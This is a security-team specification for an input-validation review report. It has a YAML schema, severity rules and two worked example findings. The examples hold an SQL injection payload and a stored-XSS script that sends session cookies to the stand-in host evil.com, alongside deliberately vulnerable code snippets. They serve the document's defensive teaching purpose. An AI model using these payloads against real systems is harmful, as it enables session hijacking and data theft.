# Input Validation Review Report Contract

## Contract Metadata

| Field | Value |
|-------|-------|
| **Contract ID** | AC-002-sec |
| **Contract Name** | Input Validation Review Report Contract |
| **Version** | 1.0.0 |
| **Owner** | security |
| **Consumers** | developer, reviewer |

---

## Purpose

Define the complete schema and validation rules for the `input-validation-review-report` artifact, which documents security findings from input handling, validation logic, and injection vulnerability reviews.

This contract satisfies:
- **AC-002**: input-validation-review-report artifact specification
- **BR-001**: Security Must Be Actionable
- **BR-002**: Evidence-Based Findings
- **BR-003**: Gate Decision Required
- **BR-004**: Severity Classification

---

## Schema

```yaml
input_validation_review_report:
  # Metadata (Required)
  dispatch_id: string              # Dispatch request ID
  task_id: string                  # Task ID being reviewed
  created_at: timestamp            # Report creation time
  created_by: string               # Always "security"
  
  # Scope (Required)
  scope:
    inputs_reviewed:               # Input sources examined
      - source: string             # API endpoint or input source
        type: enum                 # http_body | query_param | path_param | header | file | database
        parameters: string[]       # Parameter names
        description: string        # What inputs were examined
    
    data_flows_traced:             # Data flow paths analyzed
      - from: string               # Input source
        to: string                 # Data sink (database, command, file system, output)
        description: string        # How data flows
    
    review_type: enum              # Type of review performed
      - full                       # Complete input validation review
      - focused                    # Targeted review of specific inputs
      - re-review                  # Follow-up review after fixes
  
  # Findings (Required)
  findings:
    - id: string                   # Unique finding ID (VAL-XXX)
      severity: enum               # critical | high | medium | low
      category: enum               # sql_injection | xss | command_injection | path_traversal | 
                                   # nosql_injection | ldap_injection | deserialization | 
                                   # missing_validation | insufficient_validation
      
      title: string                # Brief finding title
      description: string          # Detailed description
      
      input:                       # Input source details
        source: string             # Where input comes from
        parameter: string          # Parameter name
        data_type: string          # Expected data type
        
      vulnerability:               # Vulnerability classification
        type: string               # Vulnerability type name
        cwe: string                # CWE identifier (e.g., CWE-89)
        owasp: string              # OWASP reference (e.g., A03:2021)
        description: string        # Why this is a vulnerability
        
      vulnerable_code:             # Code showing the issue
        location: string           # File:line format
        snippet: string            # Vulnerable code snippet
        
      exploit_scenario:            # How to exploit
        payload: string            # Example malicious payload
        steps: string[]            # Step-by-step exploit process
        impact: string             # What attacker can achieve
        
      remediation:                 # How to fix
        recommendation: string     # General fix recommendation
        secure_code_example: string # Secure code (markdown code block)
        validation_rules:          # Specific validation to add
          - rule: string           # Rule name
            pattern: string        # Regex or validation logic
        effort: enum               # quick | moderate | extensive
        
  # Validation Coverage (Required)
  validation_coverage:
    total_inputs: integer          # Total input parameters found
    validated_inputs: integer      # Inputs with validation
    validation_rate: number        # Percentage (0-100)
    missing_validation: string[]   # Parameters lacking validation
    
  # Risk Assessment (Required)
  risk_assessment:
    overall_risk: enum             # critical | high | medium | low
    risk_factors:
      - factor: string
        level: enum                # high | medium | low
    residual_risk: string          # Risk remaining after fixes
    
  # Gate Decision (Required - BR-003)
  gate_decision:
    decision: enum                 # pass | needs-fix | block
    conditions: string[]           # Conditions for decision
    blocking_findings: string[]    # Finding IDs that block
    
  # Recommendations (Required)
  recommendations:
    must_fix: string[]             # Immediate fixes required
    should_fix: string[]           # Recommended fixes
    consider: string[]             # Future improvements
    
  # Notes (Optional)
  notes: string | null
```

---

## Field Specifications

### severity (BR-004)

| Value | Definition | Example | Action |
|-------|------------|---------|--------|
| `critical` | Immediate exploitation, severe impact | SQL injection, command injection | Block |
| `high` | Significant vulnerability | Stored XSS, path traversal | Block or needs-fix |
| `medium` | Moderate risk | Missing validation, reflected XSS | needs-fix |
| `low` | Minor concern | Insufficient validation strictness | should_fix |

### category

| Value | Definition | CWE |
|-------|------------|-----|
| `sql_injection` | SQL query manipulation | CWE-89 |
| `xss` | Cross-site scripting | CWE-79 |
| `command_injection` | OS command execution | CWE-78 |
| `path_traversal` | File path manipulation | CWE-22 |
| `nosql_injection` | NoSQL query manipulation | CWE-943 |
| `ldap_injection` | LDAP query manipulation | CWE-90 |
| `deserialization` | Unsafe deserialization | CWE-502 |
| `missing_validation` | No input validation present | CWE-20 |
| `insufficient_validation` | Validation present but inadequate | CWE-20 |

### gate_decision.decision (BR-003)

| Value | When to Use |
|-------|-------------|
| `pass` | No injection vulnerabilities, validation adequate |
| `needs-fix` | Missing/insufficient validation, no active injection found |
| `block` | Confirmed injection vulnerability (SQL, XSS, command, etc.) |

---

## Validation Rules

### R-001: Required Fields

All fields marked as Required must be present:
- `dispatch_id`, `task_id`, `created_at`, `created_by`
- `scope.inputs_reviewed` (at least one)
- `findings` (list, can be empty)
- `validation_coverage` with all sub-fields
- `risk_assessment.overall_risk`
- `gate_decision.decision`
- `recommendations` (all three lists)

### R-002: Finding Completeness (BR-001)

Each finding must have:
- `id` in format `VAL-XXX`
- `severity` and `category` from defined enums
- `input.source` and `input.parameter`
- `vulnerable_code.location` and `vulnerable_code.snippet`
- `remediation.recommendation` and `remediation.secure_code_example`

### R-003: Evidence-Based Findings (BR-002)

Each finding must include:
- `vulnerable_code.snippet` showing the vulnerable code
- `exploit_scenario.payload` demonstrating attack vector
- `exploit_scenario.steps` explaining how to exploit

### R-004: Input Source Tracing

For each finding:
- `input.source` must trace back to a defined input point
- `data_flows_traced` should document the path from input to sink

### R-005: Gate Decision Consistency

- If `gate_decision.decision` is `block`, blocking findings must be listed
- `validation_rate` should be consistent with findings

---

## Consumer Responsibilities

### Developer

- Read `findings.vulnerable_code` to locate issues
- Apply `remediation.secure_code_example` patterns
- Address `recommendations.must_fix` items immediately
- Request re-review after fixes

### Reviewer

- Verify injection vulnerabilities are addressed
- Check `validation_coverage` is acceptable
- Factor gate decision into acceptance

---

## Producer Responsibilities

### Security Role

- Trace all input sources to data sinks
- Provide specific vulnerable code locations
- Include exploit scenarios with payloads
- Give concrete secure code examples
- Document validation gaps clearly

---

## Example: SQL Injection Finding

```yaml
input_validation_review_report:
  dispatch_id: "dispatch_008_003"
  task_id: "T-008-003"
  created_at: "2026-03-27T15:00:00Z"
  created_by: "security"
  
  scope:
    inputs_reviewed:
      - source: "GET /api/users"
        type: "query_param"
        parameters: ["username", "role"]
        description: "User search endpoint"
      - source: "POST /api/users"
        type: "http_body"
        parameters: ["username", "email", "role"]
        description: "User creation endpoint"
    
    data_flows_traced:
      - from: "query_param.username"
        to: "database.query"
        description: "Username parameter used directly in SQL query"
    
    review_type: "full"
  
  findings:
    - id: "VAL-001"
      severity: "critical"
      category: "sql_injection"
      
      title: "SQL Injection in User Search Endpoint"
      description: "The username query parameter is directly concatenated into a SQL query without parameterization, allowing arbitrary SQL execution."
      
      input:
        source: "GET /api/users?username="
        parameter: "username"
        data_type: "string"
        
      vulnerability:
        type: "SQL Injection"
        cwe: "CWE-89"
        owasp: "A03:2021 - Injection"
        description: "User-controlled input is concatenated directly into SQL query string"
        
      vulnerable_code:
        location: "src/repositories/UserRepository.ts:25"
        snippet: |
          const query = `SELECT * FROM users WHERE username = '${username}'`
          return await db.query(query)
          
      exploit_scenario:
        payload: "' OR '1'='1' --"
        steps:
          - "Attacker sends GET /api/users?username=' OR '1'='1' --"
          - "Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1' --'"
          - "Condition '1'='1' is always true"
          - "All users are returned including sensitive data"
        impact: "Attacker can read, modify, or delete all database data"
        
      remediation:
        recommendation: "Use parameterized queries with prepared statements"
        secure_code_example: |
          const query = 'SELECT * FROM users WHERE username = ?'
          return await db.query(query, [username])
        validation_rules:
          - rule: "Username format validation"
            pattern: "^[a-zA-Z0-9_]{3,50}$"
        effort: "quick"
        
    - id: "VAL-002"
      severity: "medium"
      category: "missing_validation"
      
      title: "Missing Email Format Validation"
      description: "The email parameter is not validated for proper format before storage."
      
      input:
        source: "POST /api/users"
        parameter: "email"
        data_type: "string"
        
      vulnerability:
        type: "Missing Input Validation"
        cwe: "CWE-20"
        owasp: "A03:2021 - Injection"
        description: "No validation on email format allows invalid data"
        
      vulnerable_code:
        location: "src/controllers/UserController.ts:32"
        snippet: |
          async createUser(@Body() body: CreateUserDto) {
            return this.userService.create(body)  // No email validation
          }
          
      exploit_scenario:
        payload: "invalid-email"
        steps:
          - "Attacker submits email with invalid format"
          - "Email stored without validation"
          - "System may fail when trying to send emails"
        impact: "Data quality issues, potential downstream failures"
        
      remediation:
        recommendation: "Add email format validation using a validation library"
        secure_code_example: |
          import { z } from 'zod'
          
          const emailSchema = z.string().email()
          const result = emailSchema.safeParse(email)
          if (!result.success) {
            throw new ValidationError('Invalid email format')
          }
        validation_rules:
          - rule: "Email format validation"
            pattern: "RFC 5322 compliant email regex"
        effort: "quick"
  
  validation_coverage:
    total_inputs: 5
    validated_inputs: 2
    validation_rate: 40
    missing_validation:
      - "username (length not limited)"
      - "email (format not validated)"
      - "role (enum not enforced)"
    
  risk_assessment:
    overall_risk: "critical"
    risk_factors:
      - factor: "SQL injection vulnerability"
        level: "high"
    residual_risk: "None after parameterized queries implemented"
    
  gate_decision:
    decision: "block"
    conditions:
      - "VAL-001 must be fixed (SQL injection)"
    blocking_findings: ["VAL-001"]
    
  recommendations:
    must_fix:
      - "Use parameterized queries for all database operations (VAL-001)"
    should_fix:
      - "Add email validation (VAL-002)"
    consider:
      - "Implement input validation middleware for all endpoints"
```

---

## Example: XSS Finding

```yaml
input_validation_review_report:
  dispatch_id: "dispatch_008_004"
  task_id: "T-008-004"
  created_at: "2026-03-27T17:00:00Z"
  created_by: "security"
  
  scope:
    inputs_reviewed:
      - source: "POST /api/comments"
        type: "http_body"
        parameters: ["content", "author"]
        description: "Comment submission"
    
    data_flows_traced:
      - from: "http_body.content"
        to: "html_output"
        description: "Comment content rendered directly in HTML"
    
    review_type: "focused"
  
  findings:
    - id: "VAL-003"
      severity: "high"
      category: "xss"
      
      title: "Stored XSS in Comment Display"
      description: "User-submitted comment content is rendered in HTML without output encoding, allowing stored cross-site scripting attacks."
      
      input:
        source: "POST /api/comments"
        parameter: "content"
        data_type: "string"
        
      vulnerability:
        type: "Stored XSS"
        cwe: "CWE-79"
        owasp: "A03:2021 - Injection"
        description: "User input stored and later rendered without encoding"
        
      vulnerable_code:
        location: "src/components/CommentList.tsx:15"
        snippet: |
          <div className="comment">
            {comment.content}
          </div>
          
      exploit_scenario:
        payload: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
        steps:
          - "Attacker posts comment with malicious script"
          - "Script stored in database"
          - "Other users view comment page"
          - "Script executes in victims' browsers"
          - "Attacker receives victims' session cookies"
        impact: "Session hijacking, credential theft, phishing"
        
      remediation:
        recommendation: "Encode output using a sanitization library"
        secure_code_example: |
          import DOMPurify from 'dompurify'
          
          <div className="comment">
            {DOMPurify.sanitize(comment.content)}
          </div>
        validation_rules:
          - rule: "HTML sanitization"
            pattern: "Allow only safe HTML tags (p, br, strong, em)"
        effort: "moderate"
  
  validation_coverage:
    total_inputs: 2
    validated_inputs: 0
    validation_rate: 0
    missing_validation:
      - "content (no sanitization)"
      - "author (no length limit)"
    
  risk_assessment:
    overall_risk: "high"
    risk_factors:
      - factor: "Stored XSS vulnerability"
        level: "high"
    residual_risk: "Low after output encoding implemented"
    
  gate_decision:
    decision: "block"
    conditions:
      - "VAL-003 must be fixed (XSS vulnerability)"
    blocking_findings: ["VAL-003"]
    
  recommendations:
    must_fix:
      - "Implement output encoding for all user-generated content (VAL-003)"
    should_fix: []
    consider:
      - "Add Content-Security-Policy header"
      - "Implement input sanitization at entry point"
```

---

## References

- `specs/008-security-core/spec.md` - Feature specification (AC-002)
- `specs/008-security-core/role-scope.md` - Security role scope
- `specs/008-security-core/downstream-interfaces.md` - Downstream handoff
- `.opencode/skills/security/input-validation-review/SKILL.md` - Review skill
- `role-definition.md` Section 6 - Security role definition
- `quality-gate.md` Section 3.6 - Security quality gate

---

## Document History

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2026-03-27 | Initial contract definition |